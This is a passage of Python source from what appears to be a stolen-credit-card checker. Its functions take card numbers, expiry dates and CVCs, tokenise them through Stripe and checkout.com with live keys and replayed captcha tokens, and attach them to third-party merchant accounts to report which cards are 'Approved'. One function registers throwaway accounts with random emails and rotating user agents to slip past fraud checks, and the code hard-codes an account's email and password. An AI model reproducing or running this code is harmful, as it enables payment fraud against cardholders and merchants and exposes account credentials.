	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': 'a834dc1afc',
	}
	
	response = requests.post('https://www.punctualkart.com/', params=params, cookies=cookies, headers=headers, data=data)
	try:
		i=(response.json()['error']['message'])
	except:
		return 'Approved'
	return i
def xc(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	def up():
		import requests
		headers = {
		    'authority': 'api.layerpanel.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://cp.layerpanel.com',
		    'referer': 'https://cp.layerpanel.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		json_data = {
		    'email': 'visaspam77@gmail.com',
		    'password': 'Aslam123$',
		}
		
		response = requests.post('https://api.layerpanel.com/api/auth/login', headers=headers, json=json_data)
		tok=(response.json()['token'])
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		json_data['amex']=tok
		with open('gates.json', 'w') as json_file:
			json.dump(json_data, json_file, ensure_ascii=False, indent=4)
		return chk()
	def chk():
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		try:
			tok=json_data['amex']
		except:
			up()
			return 'try again'
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		data = f'card[number]={n}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYmBOg1L6ObfSr4i_1RS-se15QIV15Us8RcUxA0bd9yeSQI48JccmVY2uxwauDpB2Ftqva0uDSJM9xCeLUXctbpNnCJMRB0UtSDpxuTrEoSdR8mvKz0jvZ5z8S1ck_gbRK0vRcuEYVXFNDJFyBv8sA6jxRSoAPhN4ssT54jTzrVAQB5Or4cNhtDWFanmTDwVxCQ82dN8g7OIKUei4s1sdiJrMoPRS5junjact1Xs6wrUk4k4lWSO3C_1uzyB6pRkKanPy5aB5U-e2CR1gQl4ZS4fVEtmLQTTZ7qkMTq7q2jq8AtZX8a_XkBF3bNQiUIsL_LUKzdE0VHuj_lx4yYRUYWMEVQ7pGhaRTVlWFV0GkLP-3Q66CAP0kQaYkRWps6sQRo65kuCoy-G0AuFqh-AZBRQJjdrUOII0sf8ZsiXzyDwQat46ezgTpgl61BZh3jaBs4pTCxeS3GaeedLvvBi96T_DJpbpwhbEU7meg9x8K0GqfqpkCH--HSLTvCOZbPyjD5j6haLtaJ_UAseMvxOxewgvR2-s-XN48l7V6jYZdu_bfmX5BrlNqfW62KBme7ITM_q7WW_TIsTTvuCO9vpKeblUZY7radp7nqVY-QWBdZlAhNIg458nhQpN5daoNmBYbD1Y5xJcnFHcG1daMZB6loJUAs_tH80L2xxM-RSrLQGjUUGZXMRH_wYzm9PkSF0RaIlZzkdO_Kkj3MOUJi0Lsvd8BAv6P3PiRmof6G4Of_GmVbCSZidslfh4A_Eca-TM0yOJ1V2EwT_1WVGgrOwD3n_dyiB_6SdmyptvRyB1Bwv3fJeogcwGHCt0xcesZ-VCy6LcNpRwrg2TkpuOsK2K0t2R6mLv7SJxTaodK6X1jzf9dQofRrRMW6F5njHDbSsyncWbPNLcyeUfMepvUObzdOWdJsXpFOOhLOQFeEjR5betDftvx2AzsjrDHswV9s854dRcY65PPzlFdTV7VENIMFv1LA51ehpO6kboH-WFPcYeZosNLl3nTjRabDmWUzYKcvpfcXyaPsdlx-CYzCtVyLLQgeK59HP8fX-dkM5I2zsnyENSVwdcduXHKPr2QMIcMkkavO5gZkOGeUhaDynflbxGmn1VCvfYsQmjRAlSc5mW52hd3xGSVgUflW1vPOIJvJI4jx5GS5qa11OmxtWywnalpI8bDtS-lfHVw3GAOx08ESj6VX2sZRHaMZyka_8B7ERhAsPKm_4PZ0jomFEqVBpn3OLrMnF76zmKWqVwVC8eH1_qxEaCX8DSUX1AreoG0Nh2h3vGdilMyStTsVeKSrdwULSIOl4vS3M_BJtehuAIhLhSwTvRgW5_pQVyHK_UfA_Syl0ZSN9yS7zJKvuMhzc_nEd1X97uJrLJlfC9lL9HIntBQdvlXzXg0Dl1DHIlYmszrqt4el6_a3xDSMyqQ36CWOz4tUSR4RC7X309DfqxZTHD9lqd2iqBcuEGpmzRa84HuuEoLwcNvdqgBs6iUB9lJ3GplCufElzGkneTbhnhZ0qj0aDrgVH-IjyolkIY5I9vLuu_ni_QBbpVPPAV4_I1ojV6SD_8og6FhfV-6yVFiuDSbGLALFywlbQezQG-duc4tOjZBwD4HENPZUfqfoQJskguGSvYnel0lug1ZAPqKe9Icio2w3_5xhNhIKZJu8wf1bgfyL6jCAEB0Oc9T_zuTvCbc_n9xylLDpXZL8_KqRAUo5e8a8T_Vc8lqWXm0UDiUL4i_KbtPfZQY2k3CasIb1a2LUfwtvhZOkbMTLcD09EEiUH260gw8A5Ymfx6wuV5WlsSfJG22_A1EW28TBy-R5VJWyd2CY3Xb60rriGrdAYKf4iqtggzy-id3uknAw5bw27SQ9eLuBV4G8qr0W33hR7smxXNprwNh9Wts05uV5b2GXblR_J5SVIrHdCUDE4DzSA5KI2XrcdBGWBqt7d0f_R8sAOU36zXvL2hNpFDpMfDX0lui7FL-leSXazh7TVkFkF9r-2KWeSo4qg294741mBs2-woC_5VH0PAUXTCDl91n8x4lBViT_vgw-tcjg0R1he_CgAlkcA5Yaym_-rKuIvNveiJPmmvEtKRvioGWUA6QSIgmjZXhwzmYntwCoc2hhcmRfaWTOAzGDb6JrcqgyNTcwNmE3NaJwZAA.uhPeNVzajBxVThOKoyBKnwFHcaWsUH3ZGQgA-UfaPs4&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=6bfbf0f5-4aba-4140-b5a6-eb3a6646d7aef11f66&sid=260715df-a638-47fd-b88c-efd4f5fa80ff44f8b3&payment_user_agent=stripe.js%2F1ac59292a4%3B+stripe-js-v3%2F1ac59292a4%3B+split-card-element&referrer=https%3A%2F%2Fcp.layerpanel.com&time_on_page=102636&key=pk_live_NpGWSJbUrLyK21Xez5lc639e'
		
		response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
		try:
			id=response.json()['id']
		except:
			return(response.json()['error']['message'])
		headers = {
		    'authority': 'api.layerpanel.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'account': 'AM-78775822',
		    'authorization': f'Bearer {tok}',
		    'content-type': 'application/json;charset=UTF-8',
		    'locale': 'en',
		    'origin': 'https://cp.layerpanel.com',
		    'referer': 'https://cp.layerpanel.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		json_data = {
		    'tokenId': id,
		}
		
		response = requests.post('https://api.layerpanel.com/api/panel/create-card/AM-78775822', headers=headers, json=json_data)
		if 'Token is Expired' in response.text:
			return up()
		if 'Token is Invalid' in response.text:
			return up()
		else:
			try:
				return (response.json()['errors'][0]['message'])
			except:
				pass
			id=response.json()['card_id']
			time.sleep(3)
			headers = {
			    'authority': 'api.layerpanel.com',
			    'accept': 'application/json, text/plain, */*',
			    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			    'account': 'AM-78775822',
			    'authorization': f'Bearer {tok}',
			    'content-type': 'application/json;charset=UTF-8',
			    'locale': 'en',
			    'origin': 'https://cp.layerpanel.com',
			    'referer': 'https://cp.layerpanel.com/',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-site',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
			}
			
			json_data = {
			    'card_id': id,
			}
			
			response = requests.post('https://api.layerpanel.com/api/panel/delete-card/AM-78775822', headers=headers, json=json_data)
			return 'Approved'
	ii=chk()
	return ii
def sf(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	def up():
		import requests
		headers = {
		    'authority': 'api.layerpanel.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/json;charset=UTF-8',
		    'origin': 'https://cp.layerpanel.com',
		    'referer': 'https://cp.layerpanel.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		json_data = {
		    'email': 'visaspam77@gmail.com',
		    'password': 'Aslam123$',
		}
		
		response = requests.post('https://api.layerpanel.com/api/auth/login', headers=headers, json=json_data)
		tok=(response.json()['token'])
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		json_data['amex']=tok
		with open('gates.json', 'w') as json_file:
			json.dump(json_data, json_file, ensure_ascii=False, indent=4)
		return chk()
	def chk():
		with open('gates.json', 'r') as file:
			json_data = json.load(file)
		try:
			tok=json_data['amex']
		except:
			up()
			return 'try again'
		headers = {
		    'authority': 'api.stripe.com',
		    'accept': 'application/json',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/x-www-form-urlencoded',
		    'origin': 'https://js.stripe.com',
		    'referer': 'https://js.stripe.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		data = f'card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYmBOg1L6ObfSr4i_1RS-se15QIV15Us8RcUxA0bd9yeSQI48JccmVY2uxwauDpB2Ftqva0uDSJM9xCeLUXctbpNnCJMRB0UtSDpxuTrEoSdR8mvKz0jvZ5z8S1ck_gbRK0vRcuEYVXFNDJFyBv8sA6jxRSoAPhN4ssT54jTzrVAQB5Or4cNhtDWFanmTDwVxCQ82dN8g7OIKUei4s1sdiJrMoPRS5junjact1Xs6wrUk4k4lWSO3C_1uzyB6pRkKanPy5aB5U-e2CR1gQl4ZS4fVEtmLQTTZ7qkMTq7q2jq8AtZX8a_XkBF3bNQiUIsL_LUKzdE0VHuj_lx4yYRUYWMEVQ7pGhaRTVlWFV0GkLP-3Q66CAP0kQaYkRWps6sQRo65kuCoy-G0AuFqh-AZBRQJjdrUOII0sf8ZsiXzyDwQat46ezgTpgl61BZh3jaBs4pTCxeS3GaeedLvvBi96T_DJpbpwhbEU7meg9x8K0GqfqpkCH--HSLTvCOZbPyjD5j6haLtaJ_UAseMvxOxewgvR2-s-XN48l7V6jYZdu_bfmX5BrlNqfW62KBme7ITM_q7WW_TIsTTvuCO9vpKeblUZY7radp7nqVY-QWBdZlAhNIg458nhQpN5daoNmBYbD1Y5xJcnFHcG1daMZB6loJUAs_tH80L2xxM-RSrLQGjUUGZXMRH_wYzm9PkSF0RaIlZzkdO_Kkj3MOUJi0Lsvd8BAv6P3PiRmof6G4Of_GmVbCSZidslfh4A_Eca-TM0yOJ1V2EwT_1WVGgrOwD3n_dyiB_6SdmyptvRyB1Bwv3fJeogcwGHCt0xcesZ-VCy6LcNpRwrg2TkpuOsK2K0t2R6mLv7SJxTaodK6X1jzf9dQofRrRMW6F5njHDbSsyncWbPNLcyeUfMepvUObzdOWdJsXpFOOhLOQFeEjR5betDftvx2AzsjrDHswV9s854dRcY65PPzlFdTV7VENIMFv1LA51ehpO6kboH-WFPcYeZosNLl3nTjRabDmWUzYKcvpfcXyaPsdlx-CYzCtVyLLQgeK59HP8fX-dkM5I2zsnyENSVwdcduXHKPr2QMIcMkkavO5gZkOGeUhaDynflbxGmn1VCvfYsQmjRAlSc5mW52hd3xGSVgUflW1vPOIJvJI4jx5GS5qa11OmxtWywnalpI8bDtS-lfHVw3GAOx08ESj6VX2sZRHaMZyka_8B7ERhAsPKm_4PZ0jomFEqVBpn3OLrMnF76zmKWqVwVC8eH1_qxEaCX8DSUX1AreoG0Nh2h3vGdilMyStTsVeKSrdwULSIOl4vS3M_BJtehuAIhLhSwTvRgW5_pQVyHK_UfA_Syl0ZSN9yS7zJKvuMhzc_nEd1X97uJrLJlfC9lL9HIntBQdvlXzXg0Dl1DHIlYmszrqt4el6_a3xDSMyqQ36CWOz4tUSR4RC7X309DfqxZTHD9lqd2iqBcuEGpmzRa84HuuEoLwcNvdqgBs6iUB9lJ3GplCufElzGkneTbhnhZ0qj0aDrgVH-IjyolkIY5I9vLuu_ni_QBbpVPPAV4_I1ojV6SD_8og6FhfV-6yVFiuDSbGLALFywlbQezQG-duc4tOjZBwD4HENPZUfqfoQJskguGSvYnel0lug1ZAPqKe9Icio2w3_5xhNhIKZJu8wf1bgfyL6jCAEB0Oc9T_zuTvCbc_n9xylLDpXZL8_KqRAUo5e8a8T_Vc8lqWXm0UDiUL4i_KbtPfZQY2k3CasIb1a2LUfwtvhZOkbMTLcD09EEiUH260gw8A5Ymfx6wuV5WlsSfJG22_A1EW28TBy-R5VJWyd2CY3Xb60rriGrdAYKf4iqtggzy-id3uknAw5bw27SQ9eLuBV4G8qr0W33hR7smxXNprwNh9Wts05uV5b2GXblR_J5SVIrHdCUDE4DzSA5KI2XrcdBGWBqt7d0f_R8sAOU36zXvL2hNpFDpMfDX0lui7FL-leSXazh7TVkFkF9r-2KWeSo4qg294741mBs2-woC_5VH0PAUXTCDl91n8x4lBViT_vgw-tcjg0R1he_CgAlkcA5Yaym_-rKuIvNveiJPmmvEtKRvioGWUA6QSIgmjZXhwzmYntwCoc2hhcmRfaWTOAzGDb6JrcqgyNTcwNmE3NaJwZAA.uhPeNVzajBxVThOKoyBKnwFHcaWsUH3ZGQgA-UfaPs4&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=6bfbf0f5-4aba-4140-b5a6-eb3a6646d7aef11f66&sid=260715df-a638-47fd-b88c-efd4f5fa80ff44f8b3&payment_user_agent=stripe.js%2F1ac59292a4%3B+stripe-js-v3%2F1ac59292a4%3B+split-card-element&referrer=https%3A%2F%2Fcp.layerpanel.com&time_on_page=102636&key=pk_live_NpGWSJbUrLyK21Xez5lc639e'
		
		response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
		try:
			id=response.json()['id']
		except:
			return(response.json()['error']['message'])
		headers = {
		    'authority': 'api.layerpanel.com',
		    'accept': 'application/json, text/plain, */*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'account': 'AM-78775822',
		    'authorization': f'Bearer {tok}',
		    'content-type': 'application/json;charset=UTF-8',
		    'locale': 'en',
		    'origin': 'https://cp.layerpanel.com',
		    'referer': 'https://cp.layerpanel.com/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		json_data = {
		    'tokenId': id,
		}
		
		response = requests.post('https://api.layerpanel.com/api/panel/create-card/AM-78775822', headers=headers, json=json_data)
		if 'Token is Expired' in response.text:
			return up()
		if 'Token is Invalid' in response.text:
			return up()
		else:
			try:
				return (response.json()['errors'][0]['message'])
			except:
				pass
			id=response.json()['card_id']
			time.sleep(3)
			headers = {
			    'authority': 'api.layerpanel.com',
			    'accept': 'application/json, text/plain, */*',
			    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			    'account': 'AM-78775822',
			    'authorization': f'Bearer {tok}',
			    'content-type': 'application/json;charset=UTF-8',
			    'locale': 'en',
			    'origin': 'https://cp.layerpanel.com',
			    'referer': 'https://cp.layerpanel.com/',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'empty',
			    'sec-fetch-mode': 'cors',
			    'sec-fetch-site': 'same-site',
			    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
			}
			
			json_data = {
			    'card_id': id,
			}
			
			response = requests.post('https://api.layerpanel.com/api/panel/delete-card/AM-78775822', headers=headers, json=json_data)
			return 'Approved'
	ii=chk()
	return ii
def info(card):
	if '3' == card[:1]:
		cvc=7706
	else:
		cvc=770
	headers = {
							'authorization': 'pk_q3mszgnusk66c24k7loecckxtaf',
							'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
						};json_data = {
							'type': 'card',
							'number': card,
							'expiry_month': 5,
							'expiry_year': 2024,
							'cvv': cvc,
							'name': 'JOHN HARGROVE',
							'phone': {},
							'preferred_scheme': '',
							'requestSource': 'JS',
						};response = requests.post('https://api.checkout.com/tokens', headers=headers, json=json_data)
	data = ['scheme', 'card_type', 'issuer']
	result = []
	for field in data:
		try:
			result.append(response.json()[field])
		except:
			result.append("------")
	try:
		us=response.json()['issuer_country']
		country=pycountry.countries.get(alpha_2=us).name
		result.append(country)
	except:
		result.append('----')
	try:
		us=response.json()['issuer_country']
		result.append(flagz.by_code(us))
	except:
		result.append('----')
	if 'card_number_invalid' in response.text:
		result.append('card_number_invalid')
	else:
		result.append('')
	return tuple(result)
def sd(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	ua = UserAgent()
	user = ua.random
	headers = {
	    'user-agent': user,
	}	
	r = requests.session()
	name = ''.join(random.choices(string.ascii_lowercase, k=15))
	number = ''.join(random.choices(string.digits, k=4))
	domain = ''.join(random.choices(string.ascii_lowercase, k=7))
	acc=f"{name}{number}@{domain}.com"
	response = r.get('https://www.bizinkonline.com/my-account/', headers=headers)
	soup = BeautifulSoup(response.text, 'html.parser')
	value = soup.find('input', {'id': 'woocommerce-register-nonce'}).get('value')
	data = {
	    'email': acc,
	    'metorik_source_type': 'typein',
	    'metorik_source_url': '(none)',
	    'metorik_source_mtke': '(none)',
	    'metorik_source_utm_campaign': '(none)',
	    'metorik_source_utm_source': '(direct)',
	    'metorik_source_utm_medium': '(none)',
	    'metorik_source_utm_content': '(none)',
	    'metorik_source_utm_id': '(none)',
	    'metorik_source_utm_term': '(none)',
	    'metorik_source_session_entry': 'https://www.bizinkonline.com/my-account-2/',
	    'metorik_source_session_start_time': '2024-04-23 23:10:19',
	    'metorik_source_session_pages': '6',
	    'metorik_source_session_count': '2',
	    'woocommerce-register-nonce': value,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	}
	
	response = r.post('https://www.bizinkonline.com/my-account/', headers=headers, data=data)	
	response = r.get('https://www.bizinkonline.com/my-account/add-payment-method/', headers=headers)
	match = re.search(r'"add_card_nonce":"([0-9a-f]+)"', response.text)
	mo = match.group(1)
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user
	}
	data = f'type=card&billing_details[name]=+&billing_details[email]=krfiwyjfbvfxfmb1972%40wxpjvpx.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=f74d9c62-2ef9-4d5e-b9bb-2f3669126976d1e1f8&muid=1f905ce9-9c7e-48e4-a552-bc829653691c98f779&sid=e8426a7b-50ba-47ce-96c2-23b338593b8c82f98e&payment_user_agent=stripe.js%2F3dcee8736b%3B+stripe-js-v3%2F3dcee8736b%3B+split-card-element&referrer=https%3A%2F%2Fwww.bizinkonline.com&time_on_page=548629&key=pk_live_6ub90MJWBYtDSkVT2x3Q27Tz&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQY-sXsL8b4P-zP3vr2a49PQmc0xCJBzf5-n9uo7k4Q8EY65uUpPFHyOtIK3V-aWjaEnIc6nOO_-2O9NJozgEFfUbPNH-xM9rzftTiFxsZBKl2upjapbTaoXc6BLo4X9ztjCXYQ5nvnVWoHU-sYztq3Ab3AELMFWvFCOv1xD4MCijH8DxqRTqBpY3-GvY8pWUnLjTR8Q6D4L57dqcoJl0p7gTh_WkTqEwYkMq412jjibhR-hBYkX6EOPzbliyhL9CAEa0iJSrN7FTMX4mlDdr9jC7kSIZU8g63GbPXil81ORK5AoZ5vYcIeo6q_cRuJBfTWINa3IJZHN6w4ZY0JtVBFqBqfEsCAePZwoZWkYLf7iE9DInU9XvmocV_dGSAdHCQ6Mf2qvSYkjHBKX80vphvMvLUVLSqBHirWkeAFgy8zYK1Z0ZaTxoE4KYmL3JBdjjyGVqymdJfu_hVksu_5dtiu04YpLCuE-0SyUweHUljQj1_ZR1F4cV2a-K1e8DT9S4ObY6NCCEHlHA__JotTNWOFDkh9se0b4iqES2D3y1yxjtIXrKrEuXfBQi_TQz0xtE7_992A8Qq64iRrzNgAX8kZV5VBZHMPbICFpi-SwAu8iUPxr8A5AuEhtgguArMacssw0w6khJCFvV-hH-diAwCdEcCLTa0ZtPpAZhBc8SwkEDdPWF3_swcIhw2i4t_xaBV39cNGYR88YRYVltz47s0bNYQ1BxygftytZFO1SsvY--L42Szmh49pR7EGhPOOeW9hTlMXYMbiP2dEczPn5H647KKTwrDyVXVeAd5nLA65ubBjUCiC6HB-C8mWVSvgB5yu60YwWOrdZ2cg__kfMS6evjYInwi7ED6Mzr2FEL1flpVDmpPqidOlHy0AF6Nj6neLtK3bzR7Mg1eB1vOMTSZj3FwSnZNEdwBF5GsCJTq_IiGNg5WrnPIyA4iaaO7bp8mNVqilsvM6bYUa6AzR0HFkcEK4mtoDk-s3pjOZ6wvD6QfFK0Fqe44Qds8RyUuOtIHy1VBdfwiKrLn3c-PpAMVPA3tobyjpkkgX1SEuFDXJlGljbzOiyVIc9MDxc815q4R3TZjwOGHULZcAN0HSk-vLNd3qF4hF0Q4Ft6GOMq40JMslvG-FS5ff5ZfBperukDaV3S1HoNVgUTN5LQTDxVNHhH3MQMxtIgrX0UBkhbtkcR5nslhBltU0FQbePi15z1kmrmyGDG3OR7AAmlhdpZ3xGuvzOD8wBe2D9aQG3MnSN-CQjHD40qaEmEIDbqUyQqwy2OUXyetmfyHpBKIwtVpLTDMbL6ECiWG2XA3aC3oog6dY9rAV9NalbI4dzSFJmBhAgd51PwzmG0t0U1lxmhJudWgQtCNHeJx6Xru3tVv5Yr0F0_g00deh7fKHbKw4qO6VsjHzPEdAg6p67lFsSp1bAnIR5WuOKq1_iY-DsASvoDLV-7G4Wx1wUTuWEcncIFV1XF5yblqtRuKm8EYgZB5UdDhA1gBfsFfx0GLnSVUDL0hPTdDc9ZJv6-acnZCyXrMROMC75z9DgSFW3bPLKmgmKdUiI3bBwODhXRAjaebwEPGbRNoNLNugjHFJytjOk0QfGkhqmxMKTKFAhw0iqAIOkSAgvn1oeRc4Hz0cdxgrZHPl-ndzr3N4vS2Pespo1FHh3q6e4tb4UHECQLwJZFGAeE5UsFkyMjGkMcCC7qtrGEgypgd9Iupm2L2eOofQjJ8B4x0BqmvDfbUhonpVZyzLWinM3VT_4r8VCwqwqwY4Rk4gSlByX-N1rXcAwmFidEDj3CkIlHuXfTyRrdrndeTCelONbtO77oyVAmFUe8j4IIwNJIN2vC1Nz5B4A7IdbXGpngNsvOLV4ZbT_L1epVcxNyDprNvTLDmGuA1l6LfvIXxNEyDS3hFlzX0vrNRh6tiZZtgHvBr0V_EoN8MSZTree4D8ixhLxTNqwGHkFt-spfdt2hsH4LRp15TDM0LwhVTnxCLOBo4mGU5JP3-7aq0t7YLfQj-ChBr-bMRpo1J4V5V7kvt6C7__GdNWk4GlMQc_5QBm84zxCCXxIDnuoVeQtqoudMKEQYndLyzjSZPvhIG4rn9X6vWhnCsCNHrxUtB9GZPhHBMc2fYigLcA-mYejZXhwzmYqa7Goc2hhcmRfaWTOAzGDb6JrcqgxODk4MjcyOKJwZAA.5WkPDQMGNzifIWPd1qV2o2TTbG40IEwv-f_4OFyqQKQ'
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=(response.json()['id'])
	except:
		return 'Your card was declined.'
	headers = {
	    'user-agent': user,
	  	}
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': mo,
	}	
	response = requests.post('https://www.bizinkonline.com/', params=params, cookies=r.cookies, headers=headers, data=data)
	
	if 'success' in response.text:
		return 'Approved'
	if 'Your card could not be set up for future usage.' in response.text:
		return 'Your card could not be set up for future usage.'
		
def scc(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
